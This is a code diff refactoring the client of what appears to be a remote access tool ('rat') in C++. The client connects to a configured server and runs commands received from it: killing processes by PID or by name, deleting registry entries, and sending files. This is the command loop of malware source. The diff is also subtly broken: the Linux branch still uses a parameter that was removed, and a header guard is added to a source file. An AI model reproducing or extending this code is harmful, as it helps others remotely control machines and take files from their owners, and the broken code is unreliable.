@@ -1,16 +1,15 @@
+#pragma once
+
 #include "client.h"
 
-rat::Client::Client(const std::string_view ip_address, int port)
-{
+rat::Client::Client(const std::string_view server_ip_address, int server_port): server_ip_address_(server_ip_address), server_port_(server_port){};
 
-}
-
-long long rat::Client::ConnectToServer(const std::string_view server_addr, int port)
+long long rat::Client::ConnectToServer()
 {
 	int i_result;
 	
 	auto connect_socket = INVALID_SOCKET;
-	struct sockaddr_in client_service;
+	struct sockaddr_in client_service{};
 
 	#ifdef _WIN32
 		WSADATA wsa_data;
@@ -32,9 +31,9 @@ long long rat::Client::ConnectToServer(const std::string_view server_addr, int p
 	// The sockaddr_in structure specifies the address family,
 	// IP address, and port of the server to be connected to.
 	client_service.sin_family = AF_INET;
-	client_service.sin_port = htons(static_cast<u_short>(port));
+	client_service.sin_port = htons(static_cast<u_short>(server_port_));
 	#ifdef _WIN32
-		InetPtonA(AF_INET, &server_addr[0], &client_service.sin_addr.s_addr);
+		InetPtonA(AF_INET, &server_ip_address_[0], &client_service.sin_addr.s_addr);
 	#elif __linux__
 		inet_pton(AF_INET, &server_addr[0], &client_service.sin_addr);
 	#endif
@@ -51,7 +50,6 @@ long long rat::Client::ConnectToServer(const std::string_view server_addr, int p
 		if (sock_.GetSocket() != INVALID_SOCKET) {
 			sock_.Close();
 		}
-		connect_socket = INVALID_SOCKET;
 		#ifdef _WIN32
 			WSACleanup();
 			return WSAGetLastError();
@@ -69,26 +67,27 @@ void rat::Client::ReceiveCommand()
 			continue;
 		}
 		std::vector<char> v = sock_.RecvBytes(cmd_size - 4);
-		if (v.size() != cmd_size - 4)
+		if (v.size() != static_cast<unsigned long long>(cmd_size) - 4)
 		{
 			continue;
 		}
-		ClientCmd cmd(sock_, &*v.begin(), v.size());
+		ClientCmd cmd(sock_, std::to_address(v.begin()), static_cast<int>(v.size()));
 		if (cmd.execute())
 		{
-			if (cmd.GetType() == static_cast<int>(rat::Command::CommandType::kClientKillPid))
+			using enum rat::Command::CommandType;
+			if (cmd.GetType() == static_cast<int>(kClientKillPid))
 			{
 				std::cout << "Successfully execute kill PID command from server with content: " << cmd.GetArgument()<< std::endl;
 			}
-			else if (cmd.GetType() == static_cast<int>(rat::Command::CommandType::kClientKillProcessName))
+			else if (cmd.GetType() == static_cast<int>(kClientKillProcessName))
 			{
 				std::cout << "Successfully execute kill process name command from server with content: " << cmd.GetArgument()<< std::endl;
 			}
-			else if (cmd.GetType() == static_cast<int>(rat::Command::CommandType::kClientDeleteRegistry))
+			else if (cmd.GetType() == static_cast<int>(kClientDeleteRegistry))
 			{
 				std::cout << "Successfully execute delete registry command from server with content: " << cmd.GetArgument()<< std::endl;
 			}
-			else if (cmd.GetType() == static_cast<int>(rat::Command::CommandType::kClientSendFile))
+			else if (cmd.GetType() == static_cast<int>(kClientSendFile))
 			{
 				std::cout << "Successfully execute send file command from server with content: " << cmd.GetArgument()<< std::endl;
 			}
@@ -96,21 +95,22 @@ void rat::Client::ReceiveCommand()
 		}
 		else
 		{
-			if (cmd.GetType() == static_cast<int>(rat::Command::CommandType::kClientKillPid))
+			using enum rat::Command::CommandType;
+			if (cmd.GetType() == static_cast<int>(kClientKillPid))
 			{
 				std::cout << "Failed to execute kill PID command from server with content: " << cmd.GetArgument()<< std::endl;
 			}
-			else if (cmd.GetType() == static_cast<int>(rat::Command::CommandType::kClientKillProcessName))
+			else if (cmd.GetType() == static_cast<int>(kClientKillProcessName))
 			{
 				std::cout << "Failed to execute kill process name command from server with content: " << cmd.GetArgument()<< std::endl;
 
 			}
-			else if (cmd.GetType() == static_cast<int>(rat::Command::CommandType::kClientDeleteRegistry))
+			else if (cmd.GetType() == static_cast<int>(kClientDeleteRegistry))
 			{
 				std::cout << "Failed to execute delete registry command from server with content: " << cmd.GetArgument()<< std::endl;
 
 			}
-			else if (cmd.GetType() == static_cast<int>(rat::Command::CommandType::kClientSendFile))
+			else if (cmd.GetType() == static_cast<int>(kClientSendFile))
 			{
 				std::cout << "Failed to execute send file command from server with content: " << cmd.GetArgument()<< std::endl;
 			}
@@ -132,4 +132,14 @@ void rat::Client::Clean()
 		WSACleanup();
 	#endif
 
+}
+
+int rat::Client::GetServerPort() const
+{
+	return server_port_;
+}
+
+std::string rat::Client::GetServerAddress() const
+{
+	return server_ip_address_;
 }
